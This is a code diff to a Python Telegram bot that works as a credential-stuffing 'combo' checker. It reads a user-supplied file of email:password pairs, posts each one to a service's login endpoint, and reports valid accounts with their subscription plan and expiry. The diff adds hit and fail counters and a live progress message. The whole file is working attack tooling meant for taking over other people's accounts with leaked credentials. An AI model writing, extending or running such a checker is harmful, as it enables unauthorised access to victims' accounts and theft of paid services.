@@ -27,6 +27,9 @@ def isVip(token):
     plan = find_between(r.text, '"default":"', '"')
     return exp, plan
 
+def count_lines(filename):
+    with open(filename, 'r') as f:
+        return len(f.readlines())
 
 @Client.on_message(filters.command(["alt", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
 async def gen(Client , message):
@@ -35,13 +38,16 @@ async def gen(Client , message):
             if message.reply_to_message.document:
                 if message.reply_to_message.document.file_name.endswith(".txt"):
                     await message.reply_to_message.download("accounts.txt")
-                    time.sleep(3)
-                    await message.reply_text("Downloading file...")
+                    msg = await message.reply_text("Downloading file...")
                     with open("downloads/accounts.txt", "r") as f:
-                        for line in f:
+                        le = count_lines("downloads/accounts.txt")
+                        hits = 0
+                        fails = 0
+                        for i, line in enumerate(f, start=1):
                             if not line.strip():
                                 break
                             else:
+                                
                                 email,password = line.split(":")
                                 password = password.strip()
                                 email = email.strip()
@@ -57,15 +63,18 @@ async def gen(Client , message):
                                 print(email+":"+password)
                                 r = requests.post(url, data=json.dumps(payload), headers=headers)
                                 if(r.status_code == 404):
+                                    fails += 1
                                     print("Invalid credentials")
                                 elif(r.status_code == 200):
+                                    hits += 1
                                     print("Valid credentials")
                                     token = r.json()['session_token']
                                     exp, plan = isVip(token)
-                                    await message.reply_text("Valid credentials found: \n"+email+":"+password+"\nExpires: "+exp+"\nPlan: "+plan)
+                                    await message.reply_text(f"Valid credentials found:{i} \n"+email+":"+password+"\nExpires: "+exp+"\nPlan: "+plan)
                                 else:
                                     print("Unknown error")
                                     print(r.status_code)
+                                msg = await msg.edit(f"<b>Combo Length: {le}\nChecking.. {i}/{le}| Hits: {hits}|Fails: {fails}</b>")
                     await message.reply_text("Checking Completed")
                     #edit message
                 else:
